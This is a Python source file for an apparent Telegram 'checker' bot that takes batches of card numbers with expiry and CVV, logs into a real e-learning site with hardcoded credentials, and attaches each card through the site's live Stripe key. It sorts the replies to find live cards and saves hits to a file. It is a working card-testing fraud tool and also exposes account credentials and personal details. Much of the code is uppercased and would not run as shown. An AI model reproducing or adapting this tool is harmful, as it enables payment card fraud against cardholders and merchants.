import os
import re
import time
import json
import asyncio
from html import unescape

import httpx
from telegram import Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

# GANTI DENGAN CHAT ID ANDA SENDIRI
ADMIN_CHAT_ID = 7519839885

# Helper function to extract substring between start and end
DEF GETS(S: str, START: str, END: str) -> str | None:
    TRY:
        START_INDEX = S.INDEX(START) + LEN(START)
        END_INDEX = S.INDEX(END, START_INDEX)
        RETURN S[START_INDEX:END_INDEX]
    EXCEPT ValueError:
        RETURN None

# Create payment method with expiry validation
ASYNC DEF CREATE_PAYMENT_METHOD(FULLZ: str, SESSION: httpx.AsyncClient) -> str:
    TRY:
        CC, MES, ANO, CVV = FULLZ.SPLIT("|")

        # Validate expiration date
        MES = MES.ZFILL(2)
        IF LEN(ANO) == 4:
            ANO = ANO[-2:]

        CURRENT_YEAR = INT(TIME.STRFtime("%y"))
        CURRENT_MONTH = INT(TIME.STRFtime("%m"))

        TRY:
            EXPIRY_MONTH = INT(MES)
            EXPIRY_YEAR = INT(ANO)
        EXCEPT ValueError:
            RETURN JSON.DUMPS({"error": {"message": "Invalid expiry date"}})

        IF EXPIRY_MONTH < 1 OR EXPIRY_MONTH > 12:
            RETURN JSON.DUMPS({"error": {"message": "Expiration Month Invalid"}})
        IF EXPIRY_YEAR < CURRENT_YEAR:
            RETURN JSON.DUMPS({"error": {"message": "Expiration Year Invalid"}})
        IF EXPIRY_YEAR == CURRENT_YEAR AND EXPIRY_MONTH < CURRENT_MONTH:
            RETURN JSON.DUMPS({"error": {"message": "Expiration Month Invalid"}})

        # Request headers etc.
        HEADERS1 = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'max-age=0',
            'Connection': 'keep-alive',
            'Referer': 'https://elearntsg.com/members/parael10/',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        # Get login token
        RESPONSE = AWAIT SESSION.GET('https://elearntsg.com/login/', HEADERS=HEADERS1)
        LOGIN_TOKEN = GETS(RESPONSE.TEXT, '"learndash-login-form" value="', '" />')
        IF NOT LOGIN_TOKEN:
            RETURN JSON.DUMPS({"error": {"message": "Failed to get login token"}})

        # Login data
        HEADERS2 = HEADERS1.COPY()
        HEADERS2.UPDATE({
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://elearntsg.com',
            'Referer': 'https://elearntsg.com/login/',
        })

        DATA_LOGIN = {
            'learndash-login-form': LOGIN_TOKEN,
            'pmpro_login_form_used': '1',
            'log': 'ayasayamaguchi12@signinid.com',   # Ganti akun login sesuai kamu
            'pwd': 'Ayasa1209',               # Ganti password sesuai kamu
            'wp-submit': 'Log In',
            'redirect_to': '',
        }

        RESPONSE = AWAIT SESSION.POST('https://elearntsg.com/wp-login.php', HEADERS=HEADERS2, DATA=DATA_LOGIN)

        FOR URL IN [
            'https://elearntsg.com/activity-feed/',
            'https://elearntsg.com/my-account/payment-methods/',
            'https://elearntsg.com/my-account/add-payment-method/'
        ]:
            RESPONSE = AWAIT SESSION.GET(URL, HEADERS=HEADERS1)

        NONCE = GETS(RESPONSE.TEXT, '"add_card_nonce":"', '"')
        IF NOT NONCE:
            RETURN JSON.DUMPS({"error": {"message": "Failed to get add_card_nonce"}})

        HEADERS_STRIPE = {
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'priority': 'u=1, i',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
        }

        DATA_STRIPE = {
            'type':'card',
            'billing_details[name]':'parael senoman',
            'billing_details[email]':'parael10@gmail.com',
            'card[number]': CC,
            'card[cvc]': CVV,
            'card[exp_month]': MES,
            'card[exp_year]': ANO,
            'guid':'6fd3ed29-4bfb-4bd7-8052-53b723d6a6190f9f90',
            'muid':'6a88dcf2-f935-4ff8-a9f6-622d6f9853a8cc8e1c',
            'sid':'6993a7fe-704a-4cf9-b68f-6684bf728ee6702383',
            'payment_user_agent':'stripe.js/983ed40936; stripe-js-v3/983ed40936; split-card-element',
            'referrer':'https://elearntsg.com',
            'time_on_page':'146631',
            'client_attribution_metadata[client_session_id]':'026b4312-1f75-4cd9-a40c-456a8883e56c',
            'client_attribution_metadata[merchant_integration_source]':'elements',
            'client_attribution_metadata[merchant_integration_subtype]':'card-element',
            'client_attribution_metadata[merchant_integration_version]':'2017',
            'key':'pk_live_HIVQRhai9aSM6GSJe9tj2MDm00pcOYKCxs',
        }

        RESPONSE = AWAIT SESSION.POST('https://api.stripe.com/v1/payment_methods', HEADERS=HEADERS_STRIPE, DATA=DATA_STRIPE)
        TRY:
            ID = RESPONSE.JSON()['id']
        EXCEPT Exception:
            RETURN RESPONSE.TEXT

        HEADERS_AJAX = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Origin': 'https://elearntsg.com',
            'Referer': 'https://elearntsg.com/my-account/add-payment-method/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Linux"',
        }

        PARAMS = {
            'wc-ajax': 'wc_stripe_create_setup_intent',
        }

        DATA_AJAX = {
            'stripe_source_id': ID,
            'nonce': NONCE,
        }

        RESPONSE = AWAIT SESSION.POST('https://elearntsg.com/', PARAMS=PARAMS, HEADERS=HEADERS_AJAX, DATA=DATA_AJAX)

        RETURN RESPONSE.TEXT

    EXCEPT Exception AS E:
        RETURN F"Exception: {STR(E)}"

# Function maps API response text to friendly message
ASYNC DEF CHARGE_RESP(RESULT):
    TRY:
        IF (
            '{"status":"SUCCESS",' IN RESULT OR
            '"status":"success"' IN RESULT
        ):
            RESPONSE = "Payment method successfully added ✅"
        ELIF "Thank you for your donation" IN RESULT:
            RESPONSE = "Payment successful! 🎉"
        ELIF "insufficient funds" IN RESULT OR "card has insufficient funds." IN RESULT:
            RESPONSE = "INSUFFICIENT FUNDS ✅"
        ELIF "Your card has insufficient funds." IN RESULT:
            RESPONSE = "INSUFFICIENT FUNDS ✅"
        ELIF (
            "incorrect_cvc" IN RESULT
            OR "security code is incorrect." IN RESULT
            OR "Your card's security code is incorrect." IN RESULT
        ):
            RESPONSE = "CVV INCORRECT ❎"
        ELIF "transaction_not_allowed" IN RESULT:
            RESPONSE = "TRANSACTION NOT ALLOWED ❎"
        ELIF '"cvc_check": "pass"' IN RESULT:
            RESPONSE = "CVV MATCH ✅"
        ELIF "requires_action" IN RESULT:
            RESPONSE = "VERIFICATION 🚫"
        ELIF (
            "three_d_secure_redirect" IN RESULT
            OR "card_error_authentication_required" IN RESULT
            OR "wcpay-confirm-pi:" IN RESULT
        ):
            RESPONSE = "3DS Required ❎"
        ELIF "stripe_3ds2_fingerprint" IN RESULT:
            RESPONSE = "3DS Required ❎"
        ELIF "Your card does not support this type of purchase." IN RESULT:
            RESPONSE = "CARD DOESN'T SUPPORT THIS PURCHASE ❎"
        ELIF (
            "generic_decline" IN RESULT
            OR "You have exceeded the maximum number of declines on this card in the last 24 hour period."
            IN RESULT
            OR "card_decline_rate_limit_exceeded" IN RESULT
            OR "This transaction cannot be processed." IN RESULT
            OR '"status":400,' IN RESULT
        ):
            RESPONSE = "GENERIC DECLINED ❌"
        ELIF "do not honor" IN RESULT:
            RESPONSE = "DO NOT HONOR ❌"
        ELIF "Suspicious activity detected. Try again in a few minutes." IN RESULT:
            RESPONSE = "TRY AGAIN IN A FEW MINUTES ❌"
        ELIF "fraudulent" IN RESULT:
            RESPONSE = "FRAUDULENT ❌ "
        ELIF "setup_intent_authentication_failure" IN RESULT:
            RESPONSE = "SETUP_INTENT_AUTHENTICATION_FAILURE ❌"
        ELIF "invalid cvc" IN RESULT:
            RESPONSE = "INVALID CVV ❌"
        ELIF "stolen card" IN RESULT:
            RESPONSE = "STOLEN CARD ❌"
        ELIF "lost_card" IN RESULT:
            RESPONSE = "LOST CARD ❌"
        ELIF "pickup_card" IN RESULT:
            RESPONSE = "PICKUP CARD ❌"
        ELIF "incorrect_number" IN RESULT:
            RESPONSE = "INCORRECT CARD NUMBER ❌"
        ELIF "Your card has expired." IN RESULT OR "expired_card" IN RESULT:
            RESPONSE = "EXPIRED CARD ❌"
        ELIF "intent_confirmation_challenge" IN RESULT:
            RESPONSE = "CAPTCHA ❌"
        ELIF "Your card number is incorrect." IN RESULT:
            RESPONSE = "INCORRECT CARD NUMBER ❌"
        ELIF (
            "Your card's expiration year is invalid." IN RESULT
            OR "Your card's expiration year is invalid." IN RESULT
        ):
            RESPONSE = "EXPIRATION YEAR INVALID ❌"
        ELIF (
            "Your card's expiration month is invalid." IN RESULT
            OR "invalid_expiry_month" IN RESULT
        ):
            RESPONSE = "EXPIRATION MONTH INVALID ❌"
        ELIF "card is not supported." IN RESULT:
            RESPONSE = "CARD NOT SUPPORTED ❌"
        ELIF "invalid account" IN RESULT:
            RESPONSE = "DEAD CARD ❌"
        ELIF (
            "Invalid API Key provided" IN RESULT
            OR "testmode_charges_only" IN RESULT
            OR "api_key_expired" IN RESULT
            OR "Your account cannot currently make live charges." IN RESULT
        ):
            RESPONSE = "stripe error contact support@stripe.com for more details ❌"
        ELIF "Your card was declined." IN RESULT OR "card was declined" IN RESULT:
            RESPONSE = "CARD DECLINED ❌"
        ELIF "card number is incorrect." IN RESULT:
            RESPONSE = "CARD NUMBER INCORRECT ❌"
        ELIF "Sorry, we are unable to process your payment at this time. Please retry later." IN RESULT:
            RESPONSE = "Sorry, we are unable to process your payment at this time. Please retry later ⏳"
        ELIF "card number is incomplete." IN RESULT:
            RESPONSE = "CARD NUMBER INCOMPLETE ❌"
        ELIF "The order total is too high for this payment method" IN RESULT:
            RESPONSE = "ORDER TO HIGH FOR THIS CARD ❌"
        ELIF "The order total is too low for this payment method" IN RESULT:
            RESPONSE = "ORDER TO LOW FOR THIS CARD ❌"
        ELIF "Please Update Bearer Token" IN RESULT:
            RESPONSE = "Token Expired Admin Has Been Notified ❌"
        ELSE:
            RESPONSE = RESULT + "❌"
            WITH OPEN("result_logs.txt", "a", encoding="utf-8") AS F:
                F.WRITE(F"{RESULT}\n")

        RETURN RESPONSE
    EXCEPT Exception AS E:
        RETURN F"{STR(E)} ❌"

# Combines create_payment_method + charge_resp + measure time
ASYNC DEF MULTI_CHECKING(FULLZ: str) -> str:
    START = TIME.TIME()
    ASYNC WITH httpx.AsyncClient(timeout=40) AS SESSION:
        RESULT = AWAIT CREATE_PAYMENT_METHOD(FULLZ, SESSION)
        RESPONSE = AWAIT CHARGE_RESP(RESULT)

    ELAPSED = ROUND(TIME.TIME() - START, 2)

    ERROR_MESSAGE = ""
    TRY:
        JSON_RESP = JSON.LOADS(RESULT)
        IF "error" IN JSON_RESP:
            ERROR_MESSAGE = UNESCAPE(JSON_RESP["error"].GET("message", "")).STRIP()
    EXCEPT Exception:
        PASS

    IF ERROR_MESSAGE:
        OUTPUT = (
            F"𝗖𝗮𝗿𝗱: » <code>{FULLZ}</code>\n"
            F"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
            F"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {ERROR_MESSAGE} ❌\n"
            F"𝗧𝗶𝗺𝗲: » {ELAPSED}s"
        )
    ELSE:
        OUTPUT = (
            F"𝗖𝗮𝗿𝗱: » <code>{FULLZ}</code>\n"
            F"𝗚𝗮𝘁𝗲𝘄𝗮𝘆: » 𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
            F"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {RESPONSE}\n"
            F"𝗧𝗶𝗺𝗲: » {ELAPSED}s"
        )
        IF ANY(KEY IN RESPONSE FOR KEY IN ["Payment method successfully added", "CVV INCORRECT", "CVV MATCH", "INSUFFICIENT FUNDS"]):
            WITH OPEN("auth.txt", "a", encoding="utf-8") AS FILE:
                FILE.WRITE(OUTPUT + "\n")

    RETURN OUTPUT

# Telegram bot handlers

TELEGRAM_BOT_TOKEN = OS.GETENV("TOKEN")

ASYNC DEF START_HANDLER(UPDATE: Update, CONTEXT: ContextTypes.DEFAULT_TYPE) -> None:
    IF UPDATE.EFFECTIVE_CHAT.ID != ADMIN_CHAT_ID:
        AWAIT UPDATE.MESSAGE.REPLY_TEXT("YOU ARE NOT AUTHORIZED TO USE THIS BOT ❌")
        RETURN
    AWAIT UPDATE.MESSAGE.REPLY_TEXT(
        "𝗣𝗔𝗥𝗔𝗘𝗟 𝗕𝗢𝗧\n"
        "SEND CARD IN FORMAT CC|MM|YY|CVV\n"
    )

ASYNC DEF HANDLE_CC_MESSAGE(UPDATE: Update, CONTEXT: ContextTypes.DEFAULT_TYPE) -> None:
    IF UPDATE.EFFECTIVE_CHAT.ID != ADMIN_CHAT_ID:
        AWAIT UPDATE.MESSAGE.REPLY_TEXT("YOU ARE NOT AUTHORIZED TO USE THIS BOT ❌")
        RETURN

    TEXT = UPDATE.MESSAGE.TEXT.STRIP()
    LINES = [LINE.STRIP() FOR LINE IN TEXT.SPLITLINES() IF LINE.STRIP()]

    MSG = AWAIT UPDATE.MESSAGE.REPLY_TEXT("PROCESSING YOUR CARD, PLEASE WAIT...", PARSE_MODE='HTML')

    TRY:
        FOR LINE IN LINES:
            PARTS = LINE.SPLIT("|")
            IF LEN(PARTS) != 4:
                AWAIT UPDATE.MESSAGE.REPLY_TEXT(
                    F"WRONG FORMAT:\n<code>{LINE}</code>\nUSE FORMAT: CC|MM|YYYY|CVV",
                    PARSE_MODE='HTML'
                )
                CONTINUE

            CC_NUM, MONTH, YEAR, CVV = PARTS
            IF LEN(YEAR) == 4:
                YEAR = YEAR[-2:]

            CC_FORMATTED = F"{CC_NUM}|{MONTH}|{YEAR}|{CVV}"

            # Optional sleep if you want to add delay (can be removed for speed)
            AWAIT ASYNCIO.SLEEP(3)

            RESULT = AWAIT MULTI_CHECKING(CC_FORMATTED)
            AWAIT UPDATE.MESSAGE.REPLY_TEXT(RESULT, PARSE_MODE='HTML')

        AWAIT MSG.DELETE()
    EXCEPT Exception AS E:
        AWAIT UPDATE.MESSAGE.REPLY_TEXT(F"ERROR: {STR(E)}")

DEF MAIN() -> None:
    APPLICATION = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()

    APPLICATION.add_handler(CommandHandler("start", START_HANDLER))
    APPLICATION.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), HANDLE_CC_MESSAGE))

    PRINT("PARAEL CHECKER BOT RUNNING...")
    APPLICATION.run_polling()

IF __name__ == "__main__":
    MAIN()
